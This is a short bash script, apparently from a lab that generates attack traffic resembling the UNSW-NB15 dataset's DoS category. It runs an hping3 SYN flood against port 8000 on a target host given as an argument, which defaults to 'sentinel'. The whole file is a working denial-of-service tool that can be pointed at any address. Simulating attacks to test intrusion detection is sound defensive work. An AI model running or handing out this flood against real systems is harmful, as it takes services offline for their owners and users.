#!/bin/bash
# DoS — SYN flood against sentinel port 8000
# Simulates the "DoS" category from UNSW-NB15
TARGET=${1:-sentinel}
DURATION=${2:-15}
echo "[*] Starting SYN flood against $TARGET for ${DURATION}s ..."
timeout "$DURATION" hping3 --flood -S -p 8000 "$TARGET" 2>&1 || true
echo "[*] DoS complete."
